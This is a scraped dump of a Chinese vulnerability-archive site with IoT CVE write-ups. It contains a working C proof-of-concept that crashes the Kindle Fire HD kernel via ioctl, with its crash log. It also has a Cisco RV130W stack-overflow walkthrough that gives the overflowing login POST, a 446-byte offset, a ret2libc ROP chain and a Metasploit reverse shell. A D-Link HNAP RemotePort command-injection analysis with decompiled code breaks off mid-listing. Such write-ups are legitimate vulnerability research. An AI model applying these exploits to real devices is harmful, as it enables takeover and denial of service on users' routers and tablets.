0-sec.org未经授权禁止转载 2020-02-04 15:07:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11025.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11025.html","title":"（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/mfd/twl6030-gpadc.c允许攻击者通过设备/ dev / twl6030上的ioctl的参数注入特制的参数-gpadc命令24832并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / twl6030-gpadc，并使用命令24832和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes * the system crash via IOCTL 24832. * * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc. * */ #include #include #include #include const static char *driver = \"/dev/twl6030-gpadc\"; static command = 24832; struct twl6030_gpadc_user_parms { int channel; int status; unsigned short result; }; int main(int argc, char **argv, char **env) { struct twl6030_gpadc_user_parms payload; payload.channel = 0x9b2a9212; payload.status = 0x0; payload.result = 0x0; int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try ioctl device file '%s', with command 0x%x and payload NULL\\n\", driver, command); printf(\"System will crash and reboot.\\n\"); if(ioctl(fd, command, &payload) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 崩溃日志 [18460.321624] Unable to handle kernel paging request at virtual address 4b3f25fc [18460.330139] pgd = ca210000 [18460.333251] [4b3f25fc] *pgd=00000000 [18460.337768] Internal error: Oops: 5 [#1] PREEMPT SMP ARM [18460.343810] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O) [18460.351440] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1) [18460.358825] PC is at twl6030_gpadc_ioctl+0x160/0x180 [18460.364379] LR is at twl6030_gpadc_conversion+0x5c/0x484 [18460.370452] pc : [] lr : [] psr: 60030013 [18460.370452] sp : de94dd90 ip : 00000000 fp : de94df04 [18460.383422] r10: 00000000 r9 : dcccf608 r8 : bea875ec [18460.389282] r7 : de94c000 r6 : 00000000 r5 : 00006100 r4 : bea875ec [18460.396697] r3 : fffffeb4 r2 : 4b3f2730 r1 : de94dee8 r0 : 00000001 [18460.404113] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user [18460.412048] Control: 10c5387d Table: 8a21004a DAC: 00000015 [18460.418609] [18460.418609] PC: 0xc031b000: [18460.423583] b000 e24b101c e30f3eb4 e34f3fff e0822082 e0812102 e51220e4 e18120b3 e5973008 [18460.434234] b020 e294200c 30d22003 33a03000 e3530000 0a000006 e3e0000c e24bd01c e89da8f0 [18460.444885] b040 e24b0e17 e3a0100c ebfcf5c4 eafffff8 e1a00004 e24b1e17 e3a0200c ebfced7f [18460.455444] b060 e3500000 0afffff3 eafffff1 e51b2170 e24b101c e30f3eb4 e34f3fff e0812102 [18460.465972] b080 e5122134 e18120b3 eaffffe3 03e0303c 150b016c 050b316c eaffffdf c0acabbc [18460.476623] b0a0 e1a0c00d e92dd800 e24cb004 e59030e0 e3530000 159000ec 03e00012 e89da800 [18460.487182] b0c0 e1a0c00d e92dd800 e24cb004 e59000f0 e89da800 e1a0c00d e92dd800 e24cb004 [18460.497863] b0e0 e5d020e9 e5d030e8 e1820003 e2000003 e89da800 e1a0c00d e92dd800 e24cb004 [18460.508544] [18460.508544] LR: 0xc031a8d0: [18460.513519] a8d0 e89da878 e1a00004 ebffff20 e2000003 e3500002 13e0000a 03a00000 e89da878 [18460.524078] a8f0 c09ba0c0 e1a0c00d e92ddff0 e24cb004 e24dd014 e2509000 0a000114 e59f5454 [18460.534759] a910 e595008c e3500000 0a00010b e2800004 eb0e1ff0 e1d910b6 e3510001 9a00000a [18460.545318] a930 e595308c e3e06015 e59f142c e5930000 ebff4e6b e595a08c e28a0004 eb0e1f69 [18460.555999] a950 e1a00006 e24bd028 e89daff0 e595a08c e3a03f52 e023a193 e5933038 e3530000 [18460.566680] a970 13e0600f 1afffff3 e59a32c4 e0818101 e595c088 e3130010 e08c7008 1a000025 [18460.577331] a990 e3510000 0a0000c4 e1d930b8 e3530001 0a0000d7 e1d940b6 e3540000 0a0000bc [18460.587890] a9b0 e3a0000e e3a01002 e3a02090 e5956088 ebfff8bc e3540001 0a0000d1 e1d920b6 [18460.598571] [18460.598571] SP: 0xde94dd10: [18460.603546] dd10 00000000 0000000d de94dda0 10624dd3 de94dd4c c031b080 60030013 ffffffff [18460.614196] dd30 de94dd7c bea875ec de94df04 de94dd48 c06a5318 c0008370 00000001 de94dee8 [18460.624877] dd50 4b3f2730 fffffeb4 bea875ec 00006100 00000000 de94c000 bea875ec dcccf608 [18460.635528] dd70 00000000 de94df04 00000000 de94dd90 c031a950 c031b080 60030013 ffffffff [18460.646087] dd90 de94ddac 9b2a9212 00000000 00000000 00040000 0001f8fc 00000000 00000000 [18460.656738] ddb0 c00795a0 00000001 de94ddd4 de94ddc8 c00795b4 c00792bc de94de0c de94ddd8 [18460.667419] ddd0 c0070df8 c00795ac de94c000 00000001 00000004 dd32f8f4 60000013 00000001 [18460.678100] ddf0 00000001 00000004 dd32f800 00000000 00000000 de94de10 c00723a0 c06a4818 [18460.688629] [18460.688659] FP: 0xde94de84: [18460.693725] de84 de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 [18460.704284] dea4 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 [18460.714935] dec4 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 [18460.725616] dee4 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 [18460.736328] df04 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 [18460.746856] df24 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 [18460.757537] df44 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 [18460.768096] df64 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 00000400 [18460.778625] [18460.778625] R1: 0xde94de68: [18460.783721] de68 c2572140 de94debc 00000001 00000028 000fffff 00000001 de94dedc de94de90 [18460.794403] de88 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 000fffff [18460.804962] dea8 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 00000001 [18460.815643] dec8 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 00000000 [18460.826202] dee8 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 c031af2c [18460.836730] df08 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 de94df0c [18460.847381] df28 de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 00000000 [18460.858032] df48 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 00000000 [18460.868713] [18460.868713] R3: 0xfffffe34: [18460.873687] fe34 ******** ******** ******** ******** ******** ******** ******** ******** [18460.884246] fe54 ******** ******** ******** ******** ******** ******** ******** ******** [18460.894805] fe74 ******** ******** ******** ******** ******** ******** ******** ******** [18460.905456] fe94 ******** ******** ******** ******** ******** ******** ******** ******** [18460.916137] feb4 ******** ******** ******** ******** ******** ******** ******** ******** [18460.926788] fed4 ******** ******** ******** ******** ******** ******** ******** ******** [18460.937347] fef4 ******** ******** ******** ******** ******** ******** ******** ******** [18460.948028] ff14 ******** ******** ******** ******** ******** ******** ******** ******** [18460.958709] [18460.958709] R7: 0xde94bf80: [18460.963684] bf80 de926680 c00635cc 00000013 de84190c de926680 c00635cc 00000013 00000000 [18460.974365] bfa0 00000000 00000000 de94bff4 de94bfb8 c0068af4 c00635d8 00000000 00000000 [18460.985015] bfc0 de926680 00000000 00000000 00000000 de94bfd0 de94bfd0 00000000 de84190c [18460.995574] bfe0 c0068a64 c004cd64 00000000 de94bff8 c004cd64 c0068a70 1d04e2fb 1dfbe204 [18461.006225] c000 00000000 00000002 00000000 c2572140 c0a0e840 00000000 00000015 cf9fca80 [18461.016906] c020 00000000 de94c000 c09ddc50 c2572140 c25717c0 c1617b40 de94da7c de94d9c8 [18461.027587] c040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000 [18461.038146] c060 00c5f4c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000 [18461.048828] [18461.048828] R9: 0xdcccf588: [18461.053802] f588 dcccf588 dcccf588 00000000 00000000 00000000 c06bc674 000200da c09dda58 [18461.064483] f5a8 00000000 00000000 dcccf5b0 dcccf5b0 00000000 dcccf5bc dcccf5bc 00000000 [18461.075134] f5c8 5ae3ed25 00000000 00000000 00000000 dcccf5e0 00000000 00000000 00000000 [18461.085815] f5e8 00200000 00000000 00000000 dcccf5f4 dcccf5f4 dccb2440 dccb2440 00000000 [18461.096343] f608 00052180 00000000 00000000 00000000 00000000 00000000 c06b9600 dd1a4800 [18461.107025] f628 dcccf6e0 dccb0300 00000c45 00000001 00a0003b 5ae3ed25 2bc5ac58 5ae3ed25 [18461.117675] f648 2bc5ac58 5ae3ed25 2bc5ac58 00000000 00000000 00000000 00000000 00000000 [18461.128234] f668 00000000 00000000 00000000 00000000 00000001 00000000 00000000 dcccf684 [18461.138885] Process twl6030_gpadc_i (pid: 12849, stack limit = 0xde94c2f8) [18461.146697] Stack: (0xde94dd90 to 0xde94e000) [18461.151611] dd80: de94ddac 9b2a9212 00000000 00000000 [18461.160827] dda0: 00040000 0001f8fc 00000000 00000000 c00795a0 00000001 de94ddd4 de94ddc8 [18461.170043] ddc0: c00795b4 c00792bc de94de0c de94ddd8 c0070df8 c00795ac de94c000 00000001 [18461.179138] dde0: 00000004 dd32f8f4 60000013 00000001 00000001 00000004 dd32f800 00000000 [18461.188354] de00: 00000000 de94de10 c00723a0 c06a4818 00000004 00000001 dd32e0d8 dd32f800 [18461.197570] de20: dd32e000 0000000a de94c000 c26fda80 de94de54 de94de40 c02ba53c c0072360 [18461.206787] de40: dd32f800 dd32e000 de94de74 de94de58 c02c3c88 c02ba518 dd32e000 00000002 [18461.215881] de60: 00000002 dd32fbbc c2572140 de94debc 00000001 00000028 000fffff 00000001 [18461.225097] de80: de94dedc de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 [18461.234313] dea0: c00723a0 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 [18461.243408] dec0: 00000000 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 [18461.252624] dee0: 00000000 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 [18461.261840] df00: c0136044 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 [18461.271057] df20: d8f925d8 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 [18461.280151] df40: de94c000 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 [18461.289367] df60: de94c000 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 [18461.298583] df80: 00000400 bea87618 00010e5c 00000000 00000036 c0013e08 00000000 de94dfa8 [18461.307800] dfa0: c0013c60 c0136578 bea87618 00010e5c 00000004 00006100 bea875ec bea875ec [18461.316894] dfc0: bea87618 00010e5c 00000000 00000036 00000000 00000000 00000000 bea87604 [18461.326110] dfe0: 00000000 bea875d4 00010698 0002918c 60000010 00000004 00000000 00000000 [18461.335296] Backtrace: [18461.338317] [] (twl6030_gpadc_ioctl+0x0/0x180) from [] (do_vfs_ioctl+0x8c/0x5b4) [18461.348571] r7:d683fb40 r6:00000004 r5:d683fb40 r4:00000000 [18461.355560] [] (do_vfs_ioctl+0x0/0x5b4) from [] (sys_ioctl+0x74/0x84) [18461.364807] [] (sys_ioctl+0x0/0x84) from [] (ret_fast_syscall+0x0/0x30) [18461.374206] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e5c r4:bea87618 [18461.382507] Code: e24b101c e30f3eb4 e34f3fff e0812102 (e5122134) [18461.401061] Board Information: [18461.401061] Revision : 0001 [18461.401092] Serial : 0000000000000000 [18461.401092] SoC Information: [18461.401092] CPU : OMAP4470 [18461.401122] Rev : ES1.0 [18461.401122] Type : HS [18461.401122] Production ID: 0002B975-000000CC [18461.401122] Die ID : 1CC60000-50002FFF-0B00935D-11007004 [18461.401153] [18461.406127] audit_printk_skb: 111 callbacks suppressed [18461.406127] type=1400 audit(1525657115.783:1097): avc: denied { getattr } for pid=12851 comm=\"am\" path=\"/system/bin/app_process\" dev=\"mmcblk0p9\" ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file [18461.406280] type=1400 audit(1525657115.783:1098): avc: denied { execute } for pid=12851 comm=\"am\" name=\"app_process\" dev=\"mmcblk0p9\" ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file [18461.406524] type=1400 audit(1525657115.783:1099): avc: denied { read open } for pid=12851 comm=\"am\" name=\"app_process\" dev=\"mmcblk0p9\" ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file [18461.406768] type=1400 audit(1525657115.783:1100): avc: denied { execute_no_trans } for pid=12851 comm=\"am\" path=\"/system/bin/app_process\" dev=\"mmcblk0p9\" ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file [18461.534057] ---[ end trace f98f4a7b98572f61 ]--- [18461.540374] Kernel panic - not syncing: Fatal exception [18461.546173] CPU1: stopping [18461.549285] Backtrace: [18461.552459] [] (dump_backtrace+0x0/0x10c) from [] (dump_stack+0x18/0x1c) [18461.561828] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950 [18461.568969] [] (dump_stack+0x0/0x1c) from [] (handle_IPI+0x190/0x1c4) [18461.578185] [] (handle_IPI+0x0/0x1c4) from [] (gic_handle_irq+0x58/0x60) [18461.587554] [] (gic_handle_irq+0x0/0x60) from [] (__irq_usr+0x40/0x60) [18461.596862] Exception stack(0xc8967fb0 to 0xc8967ff8) [18461.602691] 7fa0: 404143ed 4041294b 00000054 000012f0 [18461.611755] 7fc0: 4028cdb4 4040e438 0000012f 4041294b 4040d148 404111d8 beb9c2e0 404275c0 [18461.620971] 7fe0: 40416bef beb9c1f0 4009d01f 400a0ec0 000f0010 ffffffff [18461.628478] r6:ffffffff r5:000f0010 r4:400a0ec0 r3:404143ed [18461.635559] CPU0 PC (0) : 0xc003ee38 [18461.639617] CPU0 PC (1) : 0xc003ee54 [18461.643798] CPU0 PC (2) : 0xc003ee54 [18461.647857] CPU0 PC (3) : 0xc003ee54 [18461.651916] CPU0 PC (4) : 0xc003ee54 [18461.656097] CPU0 PC (5) : 0xc003ee54 [18461.660156] CPU0 PC (6) : 0xc003ee54 [18461.664215] CPU0 PC (7) : 0xc003ee54 [18461.668395] CPU0 PC (8) : 0xc003ee54 [18461.672454] CPU0 PC (9) : 0xc003ee54 [18461.676513] CPU1 PC (0) : 0xc0019b2c [18461.680694] CPU1 PC (1) : 0xc0019b2c [18461.684753] CPU1 PC (2) : 0xc0019b2c [18461.688812] CPU1 PC (3) : 0xc0019b2c [18461.692871] CPU1 PC (4) : 0xc0019b2c [18461.697051] CPU1 PC (5) : 0xc0019b2c [18461.701110] CPU1 PC (6) : 0xc0019b2c [18461.705169] CPU1 PC (7) : 0xc0019b2c [18461.709381] CPU1 PC (8) : 0xc0019b2c [18461.713409] CPU1 PC (9) : 0xc0019b2c [18461.717498] [18461.719268] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017 [18461.719299] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:19:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Cisco/CVE-2019-1663.html":{"url":"iot/Cisco/CVE-2019-1663.html","title":"（CVE-2019-1663）堆栈缓冲区溢出漏洞","keywords":"","body":"（CVE-2019-1663）堆栈缓冲区溢出漏洞 一、漏洞简介 CVE-2019-1663是一个影响Cisco的多个低端设备的堆栈缓冲区，由于管理界面没有对登录表单的pwd字段进行严格的过滤，底层在处理请求时，strcpy函数导致堆栈溢出，未经身份验证的远程攻击者可以在设备上执行任意代码 二、漏洞影响 Cisco RV110W 三、复现过程 0x01 固件提取 这里我使用时Cisco RV130W 1.0.3.44进行测试的，binwalk对固件进行提取 可以看出文件系统是squashfs,并且是小端存储方式,得到一个类Linux目录 0x02 分析处理请求 使用 grep -r “http”来查找处理http请求的二进制文件 根据之前分析的多个嵌入式设备的经验，猜测这个可能就是处理http请求的底层文件 0x03 漏洞分析 对Web登录界面的login.cgi发送如下的POST请求 POST /login.cgi HTTP/1.1 Host: 10.10.10.2 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://10.10.10.2/ Content-Type: application/x-www-form-urlencoded Content-Length: 137 Connection: close Upgrade-Insecure-Requests: 1 submit_button=login&submit_type=&gui_action=&wait_time=0&change_action=&enc=1&user=cisco&pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&sel_lang=EN 这里向pwd发送32字节的值，对登录界面的http处理请求在IDA中的是sub_2C614()，地址是0x0002C614 函数将POST请求的参数进行解析，存储到.bss段 然后，将pwd参数的值从.bss段中提取，调用strcpy将值存到动态分配的内存中 对于strcpy我们都很熟悉，它存在的安全问题也十分严峻，并且由于没有开启PIE / ASLR，所以可以随意的进行溢出操作 这里使用gdb进行远程调试，确定能够发生溢出的字节数，首先设置cisco,作为gdb调试的服务端，gdbserver配置 # wget http://10.10.10.1:8000/gdbserver //从本机下载到qemu模拟的cisco环境中 #chmod 777 ./gdbserver //给权限 # ps -w | grep httpd //查找httpd开启的进程号 2451 0 5472 S ./usr/sbin/httpd 2454 0 1196 S grep httpd # ./gdbserver :1234 --attach 2451 //这里的1234是开启监听的端口号，--attach添加的是httpd的进程号 Attached; pid = 2451 Listening on port 1234 //然后成功监听 编译arm-gdb-linux tar xvf gdb-7.8.1.tar.gz cd gdb-7.8.1 mkdir arm-gdb sudo chmod 777 arm-gdb sudo apt-get install texinfo ./configure --target=arm-linux --prefix=/home/clb/1tools/gdb-7.8.1/arm-gdb make && make install 然后在arm-gdb下的bin目录中就有用于调试的arm-linux-gdb，配置调试选项 ./arm-linux-gdb gef> set architecture arm //确定要调试的是arm架构 gef> set follow-fork-mode child //确定调试的进程 gef> set solib-search-path /home/clb/1iot/firmware/cisco/_RV130.bin.extracted/squashfs-root/lib/ //加载要用到的lib文件 gef> file /home/clb/1iot/firmware/cisco/_RV130.bin.extracted/squashfs-root/usr/sbin/httpd //加载调试文件 gef> target remote 10.10.10.2:1234 //与远程建立连接 已经建立调试连接，可以进行调试了 查找溢出的位置，使用pattern生成512个字符串 gef➤ patter create 512 [+] Generating a pattern of 512 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf [+] Saved as '$_gef0' 通过curl发送POST请求查找溢出的位置 gef➤ c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x616d6560 in ?? () 通过pattern确定溢出的大小 gef➤ pattern search 0x616d6561 [+] Searching '0x616d6561' [+] Found at offset 446 (little-endian search) likely 我们可以确定要进行填充的字符串是有446个字节 这里使用Ret2Libc进行利用。ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“/bin/sh”) 来打开 shell。这里我们使用vmmap查看调用的lib文件有哪些 注：由于是在模拟器中查找的lib文件的起始地址，所以和在真机中的地址可能不太一样 这里我们选择具有执行权限的libc.so.0文件，使用radare2对libc.so.0文件进行搜索system函数 这里的system函数的地址是偏移地址，偏移地址加上vmmap得到的起始地址就是，我们通过下断点得到system函数的地址，然后通过计算可以发现地址完全正确 这时我们已经知道了一些关键的地址，那么这个时候我们就需要构造一个 ROP链，来实现地址的跳转 这里使用了一款工具Ropper，因为我们存储的位置位于堆栈，所以查找跟堆栈有关的指针SP 这里我选择了0x00041308的指令，因为这里有一个关于指令跳转的指令BLX，如果r2存的值是system的地址，那么我们就能跳到system处，执行系统命令了，并且由于我们的值都存在栈中，所以我们就需要查找和pop,r2有关的指令 在ARM指令集下我们发现两个对r2的操作，但是后面还跟着别的指令，如果我们使用了某一个，那么我们还得继续寻找能够完整构造payload的指令。由于ARM除了有ARM指令外，还有一个Thumb指令集，这个指令是ARM指令集的一个子集，但是在某些方面比ARM指令集要更有效，我们切换指令集去这里看看符合我们要求的指令 这里我们找到了没有其他指令参与并且堆栈操作十分符合我们要求的指令，下面就是我们构造的堆栈的排列方式 首先排布的是target1，这条指令就是对栈就行弹出的操作，首先将system的地址弹出到r2，然后后面无用的地址弹出到r6，最后将target2的地址弹出到r15中，并且r15中存储的还是正在取指的地址。紧接着执行r15所指向的地址，首先将sp的地址存储到r0中，然后执行blx跳转指令并且切换指令集，并且跳转到r2的地址，也就是system的地址，那么这时候就成功执行system函数，到此整个ROP链也就执行完毕 0x04 漏洞复现 这里我们利用的是exploit-db上的exp 设置rhosts,lhosts和target，然后直接exploit，就能直接获得shell权限，这里我在vps上执行的 成功执行ifconfig命令 0x05 exp脚本分析 这里存储就是偏移地址，libc_base的地址，system的偏移地址，gadget1的偏移地址，gadget2的偏移地址，这些地址就是真机中真正的偏移地址 这里就是根据不同的target生成不同的payload 这里就是我们对Msf生成的payload进行输出，可以看到被攻击的设备下载了可以在ARM平台进行回来的文件，并给与权限并执行，最终创建一个shell 参考链接 http://lab.xinruisec.com/2019/09/20/CVE-2019-1663-Cisco%E7%9A%84%E5%A4%9A%E4%B8%AA%E4%BD%8E%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%9A%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 20:12:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2018-19986.html":{"url":"iot/D-Link/CVE-2018-19986.html","title":"（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞","keywords":"","body":"（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞 一、漏洞简介 D-Link DIR-822和D-Link DIR-818LW都是中国台湾友讯（D-Link）公司的一款无线路由器。 D-Link DIR-818LW Rev.A 2.05.B03和DIR-822 B1 202KRb06中的‘RemotePort’参数存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 二、漏洞影响 D-Link DIR-818LW Rev.A 2.05.B03 DIR-822 B1 202KRb06 三、复现过程 漏洞分析 原理 D-Link DIR-818LW Rev.A 2.05.B03和DIR-822 B1 202KRb06中，通过HNAP1协议访问SetRouterSettings时，RemotePort参数存在操作系统命令注入漏洞。在SetRouterSettings.php源码中，RemotPort参数没有经过任何检查，直接存放于$path_inf_wan1.\"/web\"，并且在iptwan.php中的IPTWAN_build_command函数中使用$path_inf_wan1.\"/web\"变量作为iptables的参数，同样未做检查。构造SetRouterSettings.xml，使RemotePort中包含如telnetd的shell命令，利用该漏洞执行非法操作系统命令。 ./etc/templates/hnap/SetRouterSettings.php： $path_inf_wan1 = XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $WAN1, 0); #$WAN1 = \"WAN-1\"; $nodebase=\"/runtime/hnap/SetRouterSettings/\"; …… $remotePort = query($nodebase.\"RemotePort\"); …… set($path_inf_wan1.\"/web\", $remotePort); ./etc/services/IPTABLES/iptwan.php function IPTWAN_build_command($name){ $path = XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $name, 0); …… $web = query($path.\"/web\"); …… #web作为iptables的参数写入$_GLOBALS[\"START\"] if (query($path.\"/inbfilter\") != \"\") $inbfn = cut(query($path.\"/inbfilter\"), 1, \"-\"); $hostip = query($path.\"/weballow/hostv4ip\"); if ($hostip != \"\") { if (query($path.\"/inbfilter\")!=\"\") fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" \".\"-j CK_INBOUND\".$inbfn.\"\\n\"); fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -s \".$hostip.\" -p tcp --dport \".$web.\" -j ACCEPT\\n\"); } else { if (query($path.\"/inbfilter\")!=\"\") fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" \".\"-j CK_INBOUND\".$inbfn.\"\\n\"); fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" -j ACCEPT\\n\"); } …… } PS：服务器的web目录为/htdocs/web/ 关于HNAP The Home Network Administration Protocol (HNAP) is an HTTP-Simple Object Access Protocol (SOAP)-based protocol that can be implemented inside of network devices to allow advanced programmatic configuration and management by remote entities. HNAP是由Pure Networks开发的协议，后续由Cisco管理与开发。HNAP用于网络设备之间的交互，该协议基于SOAP和HTTP，以post的方式发包。 使用HNAP：在HTTP header中加入SOAPAction，该字段中会指明请求的操作，如Login，并向http://[ip]/HNAP1发送数据，数据形式为xml。 举个栗子，下图是登录时的抓包： 192.168.0.1向路由器192.168.0.2发送数据，在SOAPAction中指定了请求内容。 路由器收到之后以LoginResponse回复发送方，返回了一些登录需要的关键数据. 发送方收到之后，login的action由request变成了login，即发送用户名密码的过程，密码是由用户私钥处理过的数据。 路由器验证登录的用户名和密码，返回登录成功信息。 理解HNAP 为了再深入理解HNAP，查看/htdocs/cgibin二进制文件，简化流程如下： hnap_main(){ memset(acStack1708,0,0x100); getenv(\"HTTP_AUTHORIZATION\"); soapaction = getenv(\"HTTP_SOAPACTION\"); request_method = getenv(\"REQUEST_METHOD\"); hnap_auth = getenv(\"HTTP_HNAP_AUTH\"); cookie = getenv(\"HTTP_COOKIE\"); referer = getenv(\"HTTP_REFERER\"); memset(php_path,0,0x100); //当未指定soapaction时，默认请求为GetDeviceSettings if (soapaction == (char *)0x0) { soapaction = \"http://purenetworks.com/HNAP1/GetDeviceSettings\"; …… } else{ …… __s1 = strstr(soapaction,\"http://purenetworks.com/HNAP1/Login\"); if (__s1 != (char *)0x0) { …… parse_param_value(uVar2,\"Action\",action); parse_param_value(uVar2,\"Username\",username); parse_param_value(uVar2,\"LoginPassword\",pwd); parse_param_value(uVar2,\"Captcha\",captcha); iVar1 = strcmp(action,\"request\"); //当action为request时 if (iVar1 == 0) { //产生一个长度为0X32的随机字符串 //例：LVy04tz2fCRlZIu8vefr1OCKu9qTOQaktWkwOhy3rNnQfhWaKB get_random_string(random_string,0x32); //cookie_value为前十个字符 //例：LVy04tz2fC strncpy(cookie_value,random_string,10); //challenge为接下来20个字符 //例：RlZIu8vefr1OCKu9qTOQ strncpy(random_challenge,random_string_10,0x14); //public key为接下来20个字符 //例：aktWkwOhy3rNnQfhWaKB strncpy(public_key,random_string_30,0x14); sprintf(public_key_and_0,\"%s%s\",public_key,0); strcpy(COOKIE,cookie_value); strcpy(CHALLENGE,random_challenge); //HMAC_MD5就是常见的HMAC，hash算法为MD5。这里函数的输出放在第三个参数中 //例：hmac_1=E188583458DE427B6A71C2DD04CB632C HMAC_MD5(random_challenge,public_key_and_0,hmac_1); …… //set challenge,privatekey,captcha //返回soap xml }//end of action=request else{ if(strcmp(action,\"login\")==0 && cookie !=0) { find_uid = strstr(cookie,\"uid=\"); if (find_uid == (char *)0x0) goto LAB_004137fc; //获取cookie的值 strncpy(cookie_value,find_uid + 4,10); //检查cookie __fd=get_cgdata_by_uid(acStack1904,cookie_value); if (__fd /dev/console\"; } else { 